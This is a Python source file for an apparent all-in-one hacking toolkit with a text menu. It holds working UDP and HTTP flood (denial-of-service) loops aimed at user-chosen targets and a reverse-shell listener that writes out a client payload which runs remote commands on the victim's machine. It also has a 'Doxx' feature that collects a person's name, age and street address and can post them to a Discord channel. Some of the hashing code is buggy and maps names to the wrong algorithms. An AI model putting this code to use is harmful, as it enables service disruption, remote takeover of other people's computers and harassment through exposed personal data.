import requests
import socket
import subprocess
import hashlib
import threading
import time
import json
import platform
import os
import random
import sys
from colorama import Fore, Style

print(Fore.LIGHTCYAN_EX + '''
 ________ ________  ________  ________  ___  _______  _________    ___    ___ 
|\  _____\\   ____\|\   __  \|\   ____\|\  \|\  ___ \|\___   ___\ |\  \  /  /|
\ \  \__/\ \  \___|\ \  \|\  \ \  \___|\ \  \ \   __/\|___ \  \_| \ \  \/  / /
 \ \   __\\ \_____  \ \  \\\  \ \  \    \ \  \ \  \_|/__  \ \  \   \ \    / / 
  \ \  \_| \|____|\  \ \  \\\  \ \  \____\ \  \ \  \_|\ \  \ \  \   \/  /  /  
   \ \__\    ____\_\  \ \_______\ \_______\ \__\ \_______\  \ \__\__/  / /    
    \|__|   |\_________\|_______|\|_______|\|__|\|_______|   \|__|\___/ /     
            \|_________|                                         \|___|/      
                                                                              
                                                                              ''')

system = platform.system()

cur_dir = os.getcwd()

client_rsh_script_content = """
import os
import subprocess
import socket
from colorama import Fore, Style

s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        try:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
            print(output_str)
        except Exception as e:
            error_message = str(e)
            s.send(str.encode(error_message))
"""

def ip_lookup():
    
    ip = input(Fore.LIGHTBLUE_EX + Style.BRIGHT + "Enter IP Address: ")

    url = f'https://ipinfo.io/{ip}/json'

    r = requests.get(url)
    try:
        ip_data = r.json()
        print(Fore.LIGHTGREEN_EX + '\nLocation Data:\n')
        print(f'Country: {ip_data["country"]}')
        print(f'City: {ip_data["city"]}')
        print(f'Region: {r.json()["region"]}')
        print(f'Latitude and Longtitude: {r.json()["loc"]}')
        print(f'Timezone: {r.json()["timezone"]}')
        print(f'ISP: {r.json()["org"]}')
        print(Fore.RED + "Note: The Latitude and Longtitude are not exact")
        time.sleep(2)

        print(Fore.BLUE + "Returning to the main menu in 5")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 4")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 3")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 2")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 1")
        time.sleep(1)
        main()
    except Exception:
        print(Fore.RED + "An error occured | Most likely due to an invalid IP") # 79.167.64.211
        time.sleep(2)
        print(Fore.BLUE + "Returning to the main menu in 5")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 4")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 3")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 2")
        time.sleep(1)
        print(Fore.BLUE + "Returning to the main menu in 1")
        time.sleep(1)
        main() 


def hash():
    while True:
        word_to_hash = input(Fore.YELLOW + "\nEnter a word to hash: ")
        algorithm = input(Fore.LIGHTCYAN_EX + "What algorith would you like to use? (-algo for list of algorithms) ")

        hash_algorithms = str([
        "SHA1",
        "MD5",
        "SHA384",
        "SHA3_256",
        "SHA224",
        "SHA512",
        "SHA3_512",
        "SHA3_384",
        "SHA3_224",
        "SHA256",
        "Blake2b",
        "Blake2s",
    ])

    
        if algorithm.lower() == "sha1":
            sha1 = hashlib.sha1(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha1}\n\nOriginal Word: {word_to_hash}\n")
        elif algorithm.lower() == "md5":
            md5 = hashlib.md5(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {md5}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha384":
            sha384 = hashlib.sha384(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha384}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha3_384":
            sha3_384 = hashlib.sha3_256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha3_384}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha224":
            sha224 = hashlib.sha224(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha224}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha512":
            sha512 = hashlib.sha512(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha512}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha3_512":
            sha3_512 = hashlib.sha3_512(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha3_512}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "shake_256":
            shake_256 = hashlib.shake_256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {shake_256}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "shake_128":
            shake_128 = hashlib.sha3_224(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {shake_128}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha256":
            sha256 = hashlib.sha256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha256}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "blake2b":
            blake2b = hashlib.blake2b(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {blake2b}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "blake2s":
            blake2s = hashlib.sha3_256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {blake2s}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha3_256":
            hashlib.sha3_256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha1}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "sha3_256":
            hashlib.sha3_256(word_to_hash.encode()).hexdigest()
            print(Fore.GREEN + f"Hashed Word: {sha1}\n\nOriginal Word: {word_to_hash}\n")
            hash_again()
        elif algorithm.lower() == "-algo":
            print(Fore.MAGENTA + hash_algorithms)
            hash_again()
        elif algorithm == "exit":
            main()
            break
        else:
            print(Fore.RED + "Please enter a valid option!")

def hash_again():
    again = input("Would you like to hash another word? (y/N) ")
    if again == 'n' or again == "N":
        main()
    else:
        hash()

def nmap():
    is_installed = input(Fore.RED + Style.BRIGHT + "Do you have nmap installed? (y/N) ").lower()
    if is_installed == "n":
        if system == "Linux":
            y_n = input(Fore.LIGHTCYAN_EX + Style.BRIGHT + "Would you like to install nmap? (y/N) ").lower()
            if y_n == 'y':
                subprocess.run(['sudo', 'apt', 'install', 'nmap'])
                print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nSuccessfully installed nmap!")
            while True:
                cmd = input(Fore.LIGHTCYAN_EX + "nmap" + Fore.LIGHTGREEN_EX + " > ")
                try:
                    os.system(cmd)
                    if cmd == "exit" or cmd == "quit":
                        main()
                        break
                except Exception:
                        cmd()

        elif system == "Windows":
            print(Fore.RED + Style.BRIGHT + "Instructions: Visit https://nmap.org/download.html and click on the 'Windows' button to download nmap.")
            print("\nOnce you have installed it, you may run it from here.\nReturning you to the main menu in 5 seconds...")
            time.sleep(5)
            main()

        elif system == "Darwin":
            print(Fore.RED + Style.BRIGHT + "Instructions: Visit https://nmap.org/download.html and click on the 'MacOS' button to download nmap.")
            print("\nOnce you have installed it, you may run it from here.\nReturning you to the main menu in 5 seconds...")
            time.sleep(5)
            main()

        else:
            print(Fore.RED + Style.BRIGHT + "Your Platform is not supported.\nReturning you to the main menu in 5 seconds...")
            time.sleep(5)
            main()

    elif is_installed == 'y':
        while True:
            cmd = input(Fore.LIGHTCYAN_EX + "nmap" + Fore.LIGHTGREEN_EX + " > ")
            try:
                os.system(cmd)
                if cmd == "exit" or cmd == "quit":
                    main()
                    break
            except Exception:
                cmd()

def dos():
    ip = input(Fore.BLUE + Style.BRIGHT + "Enter IP: ")
    port = int(input(Fore.BLUE + Style.BRIGHT + "Enter Port: "))

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    count = 0

    while True:
        try:
            s.sendto(random._urandom(12233), (ip, port))

            count += 1

            print(Fore.GREEN + Style.DIM + f"Amount of UDP Packets sent to {ip}:{port} = {count}")
        except KeyboardInterrupt:
            print(Style.RESET_ALL)
            print(Fore.LIGHTCYAN_EX)
            main()

def http():
    addr = input(Fore.BLUE + Style.BRIGHT + "Enter Target URL (including http/https):  ")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    count = 0

    payload = {
        "data": random._urandom(12233)
    }

    while True:
        try:
            requests.post(addr, data=payload)

            count += 1

            print(Fore.RED + Style.BRIGHT + f'This is the {count}th request sent to {addr}')
        except KeyboardInterrupt:
            print(Style.RESET_ALL)
            print(Fore.LIGHTCYAN_EX)
            main()

def upload():
            while True:
                upload = input(Fore.BLUE + Style.BRIGHT + "Would you like to upload it somewhere? (Yes/No) ").upper()
                if upload == "YES":
                    disc = input(Fore.GREEN + Style.BRIGHT + "Would you like to upload it on discord? (y/n)")
                    if disc == 'y'.lower():
                        channel_id = input(Fore.LIGHTCYAN_EX + Style.BRIGHT + "Enter Channel ID: ")
                        token = input(Fore.LIGHTCYAN_EX + Style.BRIGHT + "Enter User token: ")

                        payload = {
                            "content": f"Name: {name}\nAge: {age}\nCountry: {country}\nCity: {city}\nStreet: {street}"
                        }

                        authorization = {
                            "Authorization": token
                        }

                        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

                        while True:
                            r = requests.post(url, json=payload, headers=authorization)
                            if r.status_code == 200:
                                print(Fore.BLUE + Style.BRIGHT + "Message sent successfully.")
                                time.sleep(2.5)
                                main()
                                break
                            else:
                                print(Fore.RED + Style.BRIGHT + "Invalid Channel ID, and/or user token!")
                                time.sleep(2.5)
                                main()
                                break

                elif upload == "NO":
                    print("Data not saved.")
                    main()
                    break
                else:
                    print("Please enter 'Yes' or 'No'.")

def doxx():
    global name 
    global age 
    global country 
    global city 
    global street 

    name = input(Fore.LIGHTRED_EX + Style.BRIGHT + "Name: ")
    age = input(Fore.LIGHTRED_EX + Style.BRIGHT + "Age: ")
    country = input(Fore.LIGHTRED_EX + Style.BRIGHT + "Country: ")
    city = input(Fore.LIGHTRED_EX + Style.BRIGHT + "City: ")
    street = input(Fore.LIGHTRED_EX + Style.BRIGHT + "Street: ")

    while True:
        save = input(Fore.BLUE + Style.BRIGHT + "Would you like to save it on your computer? (Yes/No) ").upper()
        if save == "YES":
            cur_dir = os.getcwd()  # Get current directory
            with open(os.path.join(cur_dir, 'info.txt'), 'w') as f:
                f.write(f"Name: {name}\nAge: {age}\nCountry: {country}\nCity: {city}\nStreet: {street}")
            print(Fore.BLUE + Style.BRIGHT + f"Successfully saved to {os.path.join(cur_dir, 'info.txt')}!")
            time.sleep(3.5)
            main()
            break
        elif save == "NO":
            print("Data not saved.")
            time.sleep(1.5)
            upload()
            break
        else:
            print("Please enter 'Yes' or 'No'.")


def chat():
    try:
        #Define constants to be used
        HOST_IP = socket.gethostbyname(socket.gethostname())
        HOST_PORT = 12345
        ENCODER = "utf-8"
        BYTESIZE = 1024

        #Create a server socket, bind it to a ip/port, and listen
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST_IP, HOST_PORT))
        server_socket.listen()

        #Accept any incoming connection and let them know they are connected
        print("Server is running...\n")
        client_socket, client_address = server_socket.accept()
        client_socket.send("You are connected to the server...\n".encode(ENCODER))

        #Send/receive messages
        while True:
            #Receive information from the client
            message = client_socket.recv(BYTESIZE).decode(ENCODER)

            #Quit if the client socket wants to quit, else display the message
            if message == "quit": 
                client_socket.send("quit".encode(ENCODER))
                print("\nEnding the chat...goodbye!")
                break
            else:
                print(f"\n{message}")
                message = input("Message: ")
                client_socket.send(message.encode(ENCODER))

        #Close the socket
        server_socket.close()
    except KeyboardInterrupt:
        main()

def reverse_shell():
    try:
        # Create a Socket (connect two computers)
        def create_socket():
            try:
                global host 
                global port 
                global s
                host =""
                port = 9999
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error as msg:
                print("Socket creation error: " + str(msg))

        # Binding the socket and listening for connections
        def bind_socket():
            try:
                global host 
                global port 
                global s
            
                print("Listening on port: " + str(port))
                print(Fore.RED + Style.BRIGHT + f"\nThe client side script has been saved to " + os.path.join(cur_dir, 'client.py'))
                with open('client.py', 'w') as f:
                    f.write(client_rsh_script_content)

                s.bind((host,port))
                s.listen(5)
            
            except socket.error as msg:
                print("Socket binding error" + str(msg) + "\n" + "Retrying...")
                bind_socket()

        # Establish connection with a client (socket must be listening)
                
        def socket_accept():
            conn,address = s.accept()
            print("Connection has been established! | " + "IP " + address[0] + " PORT " + str(address[1]))
            send_commands(conn)
            conn.close()

        # Send commands to client/victim or a friend
        def send_commands(conn):
            while True:
                cmd = input() # get an input
                if cmd == "quit": 
                    conn.close()
                    s.close()
                    sys.exit()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(1024),"utf-8")
                    print(client_response, end="")

        def main2():
            create_socket()
            bind_socket()
            socket_accept()

        main2()
    except KeyboardInterrupt:
        main()

def main():
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'I' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " IP Lookup")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'II' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " Hashing")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'III' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " Port Scanning (nmap)")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'IV' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " DoS")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'V' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " HTTP Flood Attack")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'VI' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " Doxx")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'VII' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " Client-Client Socket Communication")
    print(Fore.LIGHTCYAN_EX + '[' + Fore.WHITE + 'VIII' + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTGREEN_EX + " Reverse Shell\n")



    while True:
        select = input(Fore.LIGHTCYAN_EX + 'Select' + Fore.LIGHTGREEN_EX + " > ")

        if select.upper() == "I":
            ip_lookup()
            break
        elif select.upper() == "II":
            hash()
            break
        elif select.upper() == "III":
            nmap()
            break
        elif select.upper() == "IV":
            dos()
            break
        elif select.upper() == "V":
            http()
            break
        elif select.upper() == "VI":
            doxx()
            break
        elif select.upper() == "VII":
            chat()
            break
        elif select.upper() == "VIII":
            reverse_shell()
            break
        elif select.upper() == "quit":
            exit()
        else:
            print(Fore.RED + "Please enter a valid option!")

if __name__ == "__main__":
    main()